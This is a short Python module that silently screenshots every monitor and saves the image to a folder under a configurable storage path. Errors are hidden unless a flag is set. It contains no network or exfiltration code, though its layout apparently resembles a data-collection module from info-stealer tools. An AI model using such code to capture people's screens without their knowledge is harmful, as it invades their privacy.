from os import mkdir, path
from multiprocessing import Process

from mss import mss


class Screenshot(Process):

    def __init__(self, storage_path: str, folder: str, errors: bool):
        Process.__init__(self)

        self.storage_path = storage_path
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        storage_path = rf"{self.storage_path}\{self.folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    def __create_screen(self):

        with mss() as screen:
            screen.shot(mon=-1, output=rf"{self.storage_path}\{self.folder}\Screenshot.png")

    def run(self):

        try:

            self.__create_folder()
            self.__create_screen()

        except Exception as e:
            if self.errors is True: print(f"[Screenshot]: {repr(e)}")
